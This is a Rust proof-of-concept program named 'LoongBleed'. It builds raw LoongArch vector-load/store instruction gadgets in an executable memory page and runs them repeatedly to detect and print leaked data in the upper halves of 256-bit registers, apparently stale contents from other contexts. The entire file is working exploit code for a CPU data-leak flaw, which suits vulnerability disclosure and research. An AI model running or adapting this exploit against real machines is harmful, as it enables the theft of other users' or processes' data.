/// LoongBleed PoC.

// Instruction encodings for gadget construction
// xvld $xrN, $rj, imm12 = 0x2c800000 | N | (rj<<5) | (imm12<<10)
// vld  $vrN, $rj, imm12 = 0x2c000000 | N | (rj<<5) | (imm12<<10)
// xvst $xrN, $rj, imm12 = 0x2cc00000 | N | (rj<<5) | (imm12<<10)
// fld.d $fN, $rj, imm12  = 0x2b800000 | N | (rj<<5) | (imm12<<10)
// fld.s $fN, $rj, imm12  = 0x2b000000 | N | (rj<<5) | (imm12<<10)
// vor.v $vrN, $vrN, $vrN = 0x71268000 | N | (N<<5) | (N<<10)

const R_A0: u32 = 4; // $a0 base register for loads/stores

const fn xvld_enc(rd: u32, imm12: u32) -> u32 {
    0x2c800000 | rd | (R_A0 << 5) | (imm12 << 10)
}
const fn vld_enc(rd: u32, imm12: u32) -> u32 {
    0x2c000000 | rd | (R_A0 << 5) | (imm12 << 10)
}
const fn xvst_enc(rd: u32, imm12: u32) -> u32 {
    0x2cc00000 | rd | (R_A0 << 5) | (imm12 << 10)
}
const fn fldd_enc(fd: u32, imm12: u32) -> u32 {
    0x2b800000 | fd | (R_A0 << 5) | (imm12 << 10)
}
const fn flds_enc(fd: u32, imm12: u32) -> u32 {
    0x2b000000 | fd | (R_A0 << 5) | (imm12 << 10)
}
const fn vorv_enc(rd: u32) -> u32 {
    0x71268000 | rd | (rd << 5) | (rd << 10)
}

fn main() {
    let args: Vec<String> = std::env::args().collect();
    let num_iterations: u64 = args.get(1).and_then(|s| s.parse().ok()).unwrap_or(100_000);
    let gadget_name = args.get(2).map(|s| s.as_str()).unwrap_or("all");

    // Build a code sequence: for each of 16 registers, emit xvld + narrow + xvst
    let build_code = |narrow_fn: &dyn Fn(u32, u32) -> u32| -> Vec<u32> {
        let mut code = Vec::new();
        for n in 0u32..16 {
            let offset = n * 64; // byte offset into buffer
            let store_offset = offset + 32;
            code.push(xvld_enc(n, offset)); // xvld $xrN, $a0, offset
            code.push(narrow_fn(n, offset)); // narrow op (vld/fld.d/fld.s/vor.v)
            code.push(xvst_enc(n, store_offset)); // xvst $xrN, $a0, offset+32
        }
        // jr $ra to return
        code.push(0x4c000020); // jirl $r0, $ra, 0
        code
    };

    let narrow_vld = |n: u32, off: u32| vld_enc(n, off);
    let narrow_fldd = |n: u32, off: u32| fldd_enc(n, off);
    let narrow_flds = |n: u32, off: u32| flds_enc(n, off);
    let narrow_vor = |n: u32, _off: u32| vorv_enc(n);

    let gadgets: Vec<(&str, Vec<u32>)> = match gadget_name {
        "vld" => vec![("vld", build_code(&narrow_vld))],
        "fld.d" => vec![("fld.d", build_code(&narrow_fldd))],
        "fld.s" => vec![("fld.s", build_code(&narrow_flds))],
        "vor" => vec![("vor", build_code(&narrow_vor))],
        "all" => vec![
            ("vld", build_code(&narrow_vld)),
            ("fld.d", build_code(&narrow_fldd)),
            ("fld.s", build_code(&narrow_flds)),
            ("vor", build_code(&narrow_vor)),
        ],
        _ => {
            eprintln!("Usage: {} [iterations] [gadget]", args[0]);
            eprintln!("  gadget: vld, fld.d, fld.s, vor, all (default: all)");
            std::process::exit(1);
        }
    };

    for (name, code) in &gadgets {
        run_gadget(name, code, num_iterations);
    }
}

fn run_gadget(name: &str, code: &[u32], num_iterations: u64) {
    eprintln!(
        "Running {} gadget for {} iterations...",
        name, num_iterations
    );

    // Allocate executable page
    let page_size = 4096usize;
    let code_page = unsafe {
        libc::mmap(
            std::ptr::null_mut(),
            page_size,
            libc::PROT_READ | libc::PROT_WRITE | libc::PROT_EXEC,
            libc::MAP_PRIVATE | libc::MAP_ANONYMOUS,
            -1,
            0,
        )
    };
    if code_page.is_null() {
        eprintln!("mmap failed for code page");
        return;
    }

    // Copy code into page
    for (i, &inst) in code.iter().enumerate() {
        unsafe {
            std::ptr::copy_nonoverlapping(
                inst.to_le_bytes().as_ptr(),
                (code_page as *mut u8).add(i * 4),
                4,
            );
        }
    }

    // Allocate 32-byte aligned buffer for LASX
    let layout = std::alloc::Layout::from_size_align(1024, 32).unwrap();
    let buf = unsafe { std::alloc::alloc_zeroed(layout) };

    let mut seen: std::collections::HashSet<Vec<u8>> = std::collections::HashSet::new();
    let mut total_leaks = 0u64;

    let code_fn: unsafe extern "C" fn(*mut u8) = unsafe { std::mem::transmute(code_page) };

    for i in 0..num_iterations {
        // Zero the buffer
        unsafe { std::ptr::write_bytes(buf, 0, 1024) };

        // Execute the gadget
        unsafe {
            code_fn(buf);
        }

        // Check for leaks in upper 128 bits of each register's output
        let buf_slice = unsafe { std::slice::from_raw_parts(buf, 1024) };
        for reg in 0..16 {
            let output = &buf_slice[reg * 64 + 32..reg * 64 + 64];
            if output.iter().any(|&b| b != 0) {
                total_leaks += 1;
                if seen.insert(output.to_vec()) {
                    // Format as two u128 values: lower 128 bits and upper 128 bits of the 256-bit register
                    let lower = u128::from_le_bytes(output[0..16].try_into().unwrap());
                    let upper = u128::from_le_bytes(output[16..32].try_into().unwrap());
                    eprintln!(
                        "[{}] {} LEAK in $xr{} (lower=0x{:032x} upper=0x{:032x})",
                        i, name, reg, lower, upper
                    );
                    let printable: String = output
                        .iter()
                        .map(|&b| {
                            if (0x20..=0x7e).contains(&b) {
                                b as char
                            } else {
                                '.'
                            }
                        })
                        .collect();
                    eprintln!("    ascii: \"{}\"", printable);
                }
            }
        }
    }

    unsafe {
        std::alloc::dealloc(buf, layout);
        libc::munmap(code_page, page_size);
    }

    eprintln!(
        "{}: done. {} total leak events, {} unique values out of {} iterations.",
        name,
        total_leaks,
        seen.len(),
        num_iterations
    );
}
